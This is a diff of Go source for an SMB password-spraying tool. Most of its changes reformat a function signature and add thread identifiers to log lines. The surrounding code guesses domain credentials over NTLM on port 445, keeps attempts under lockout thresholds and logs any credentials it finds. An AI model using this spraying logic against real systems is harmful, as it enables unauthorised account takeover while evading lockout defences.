@@ -180,7 +180,14 @@ func multiSpray(usernamePath string, passwordPath string, domain string, targetI
 	log.Println("Crimson Spray Completed")
 }
 
-func UserSpray(username string, passwordSlice []string, domain string, targetIP string, lockoutThreshold int, lockoutResetTimer int, lockoutTimer int, verbose int) string {
+func UserSpray(
+	username string,
+	passwordSlice []string,
+	domain string, targetIP string,
+	lockoutThreshold int,
+	lockoutResetTimer int,
+	lockoutTimer int,
+	verbose int) string {
 	resetTimerDuration := lockoutResetTimer + 1
 	attemptThreshold := lockoutThreshold - 2
 	currentPasswordIndex := 0
@@ -224,7 +231,7 @@ func testCred(name string, passwordGuess string, domainDst string, ip string, ve
 	*/
 	dstServer := fmt.Sprintf("%s:445", ip)
 	if verbose >= 4 {
-		log.Printf("Attempting to connect to %s (%s Thread %d)", dstServer, name, currentAttempt)
+		log.Printf("(%s Thread %d) Attempting to connect to %s", name, currentAttempt,dstServer,)
 	}
 	conn, err := net.Dial("tcp", dstServer)
 	if err != nil {
@@ -232,8 +239,8 @@ func testCred(name string, passwordGuess string, domainDst string, ip string, ve
 	}
 	defer conn.Close()
 	if verbose >= 4 {
-		log.Printf("Connected to %s (%s Thread %d)", dstServer, name, currentAttempt)
-		log.Printf("Attempting %s\\%s:%s @ %s --- ", domainDst, name, passwordGuess, dstServer)
+		log.Printf("(%s Thread %d) Connected to %s",  name, currentAttempt,dstServer,)
+		log.Printf("(%s Thread %d) Attempting authentication with %s\\%s:%s @ %s",name,currentAttempt, domainDst, name, passwordGuess, dstServer)
 	}
 	d := &smb2.Dialer{
 		Initiator: &smb2.NTLMInitiator{
@@ -245,19 +252,19 @@ func testCred(name string, passwordGuess string, domainDst string, ip string, ve
 	_, err = d.Dial(conn)
 	if err != nil {
 		if verbose >= 4 {
-			log.Print(err.Error())
+			log.Printf("(%s Thread %d),%s",name,currentAttempt,err.Error())
 		}
 		if strings.Contains(err.Error(), "automatically locked because too many invalid logon attempts") {
 			return 2
 		} else {
 			if verbose >= 3 {
-				log.Printf("Failed %s\\%s:%s\n", domainDst, name, passwordGuess)
+				log.Printf("(%s Thread %d) Failed %s\\%s:%s\n",name,currentAttempt, domainDst, name, passwordGuess)
 			}
 			return 1
 		}
 	} else {
 		if verbose >= 1 {
-			log.Printf("!!!Found Creds (  %s\\%s:%s  )!!!\n", domainDst, name, passwordGuess)
+			log.Printf("(%s Thread %d) !!!Found Creds (  %s\\%s:%s  )!!!\n",name,currentAttempt, domainDst, name, passwordGuess)
 		}
 		return 0
 	}
